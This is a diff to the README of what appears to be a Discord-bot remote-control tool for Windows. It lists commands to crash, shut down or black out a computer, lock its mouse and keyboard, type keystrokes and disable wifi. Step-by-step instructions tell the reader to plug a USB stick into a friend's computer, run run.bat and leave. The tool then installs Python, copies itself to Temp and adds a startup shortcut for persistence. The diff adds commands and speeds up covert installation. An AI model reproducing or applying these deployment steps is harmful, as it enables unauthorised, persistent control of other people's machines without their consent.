@@ -19,19 +19,23 @@ Target defined in `config.ini`
 - **hello**: Check if Bot is online
 - **beep**: Emits a beep sound
 - **bomb**: Makes computer slow for a moment
+- **shutdown**: Shutdown computer
 - **crash**: Crash computer
-- **image**: Opens an image
-- **lock_input**: Locks input (Mouse and Keyboard)
-- **lock_input2**: Locks input (Mouse and Keyboard) \[Method 2]
-- **unlock_input**: Unlocks input (Mouse and Keyboard)
 - **off_wifi**: Disable wifi
+- **image**: Opens an image
+- **site**: Opens any website
+- **black_screen** Puts a black screen
+- **sleep**: Puts computer into sleep mode (Lock user session)
 - **play_sound**: Plays a sound
 - **stop_sound**: Stops the sound
 - **set_volume**: Sets computer's volume from 0 to 100
-- **shutdown**: Shutdown computer
-- **site**: Opens any website
+- **set_brightness**: Sets computer's brightness from 0 to 100
+- **lock_input**: Locks input (Mouse and Keyboard)
+- **lock_input2**: Locks input (Mouse and Keyboard) \[Method 2]
+- **unlock_input**: Unlocks input (Mouse and Keyboard)
 - **type**: Type letters (keys and hotkeys) and combine them
 - **type2**: Type letters (keys and hotkeys) and combine them \[Method2]
+- **type3**: Type letters (keys and hotkeys) and combine them \[Method3]
 
 ### No Category
 
@@ -61,7 +65,7 @@ Target defined in `config.ini`
 9. Save the config.ini
 10. Copy all the files to a Pen USB.
 11. When you are near your friend just plug the Pen USB in his computer and double click on `run.bat`
-11. Wait until the window closes which can take ~30s (there is a small chance that the dependencies are already installed which could reduce the time from ~30s to ~1s) and everything done. Wait 2s and unplug the Pen USB. 
+11. Wait until the window closes which takes about ~2s. Now unplug the Pen USB and it's all done! 
 12. Go back to your computer/mobile and in your discord server which has the bot you should be able to run any command Target-Command. Ex: Fytex-help
 13. To view more info about each command do Target-help Command. Ex: Fytex-help type
 
@@ -88,7 +92,7 @@ All cleaned!
 
 ## How this works internally
 
-When you inject the pen and click `run.bat` it checks if you have python3.8+ installed otherwise it installs for you.  
+When you inject the pen and click `run.bat` it checks if you have python3.8+ installed otherwise it installs for you. (It caches it in target's computer to avoid waiting with the Pen USB plugged) 
 Then it copies the files to your Temp folder and creates a shortcut in your startup folder.  
 Inside the program it is a discord bot with some comands for windows.
 
